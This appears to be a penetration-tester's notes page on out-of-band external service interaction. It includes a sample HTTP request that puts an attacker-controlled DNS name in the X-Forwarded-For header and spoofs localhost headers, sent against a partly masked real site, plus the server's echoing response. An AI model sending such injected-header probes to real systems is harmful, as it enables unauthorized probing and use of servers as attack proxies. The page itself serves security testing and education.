# Out-of-band communication / external service interaction
External service interaction arise when the application interacts with an arbitrary external service, such as HTTP/HTTPS, DNS, FTP or e-mail servers.
The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, however, it allows the vulnerable server to be used as an attack proxy server.
There are a few types of external service interaction:
- [External Service Interaction (HTTP/HTTPS)](#external-service-interaction-(http/https))
- [External Service Interaction (DNS)](#external-service-interaction(DNS))
- [Out-of-band Resource Load (HTTP)](#out-of-band-resource-load-(http))

## External service interaction (DNS)
Payload: `X-Forwarded-For: external-dns-interaction.whitecat.dns.server.here`
#### Request:
```
GET / HTTP/1.1
Host: deliver**.ie
X-Forwarded-For: external-dns-interaction.whitecat.dns.server.here
True-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
Referer: http://127.0.0.1/
X-WAP-Profile: http://127.0.0.1/wap.xml
X-Scraped: 127.0.0.1
Pragma: no-cache
Cache-Control: no-cache, no-transform
Connection: close
```

#### Response:
```
HTTP/1.1 500 Internal Server Error
Date: Thu, 19 Jul 2018 19:14:10 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 46356
Connection: close
[...]
"ip":"external-dns-interaction.whitecat.dns.server.here","referer":"http://127.0.0.1/"
[...]
```

#### Bind logs:
![Logo](https://www.pwncave.net/images/deliver-ext-dns-int-bind.PNG)

#### Interaction with `netcat`
![Logo](https://www.pwncave.net/images/deliver-nc-udp-53.PNG)

### References
- https://portswigger.net/kb/issues/00300200_external-service-interaction-dns
- https://www.slideshare.net/Insovince/external-service-interaction
